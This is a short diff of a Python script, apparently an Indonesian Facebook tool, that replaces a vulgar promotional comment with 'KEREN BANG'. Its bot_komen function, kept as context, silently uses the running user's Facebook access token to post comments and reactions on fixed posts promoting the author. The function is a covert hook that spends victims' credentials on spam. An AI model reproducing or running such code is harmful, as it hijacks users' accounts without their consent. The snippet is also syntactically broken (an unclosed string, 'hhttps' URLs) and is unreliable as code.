@@ -1,4 +1,4 @@
-# -*- coding: utf-8
+ # -*- coding: utf-8
 # coded by NikyipratamaXD
 # coded by angga kurniawan
 # fb.me/NikyipratamaXD
@@ -61,7 +61,7 @@ def bot_komen():
     post = ('1031861840659590') 
     post2 = ('1110619372783836') 
     kom = ('GW PAKE SC LU BANG @[107782498178349:0] 😍😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl') 
-    kom2 = ('ngentot yu bang @[1077824981783490] 😘😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl
+    kom2 = ('KEREN BANG @[1077824981783490] 😘😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl
     reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
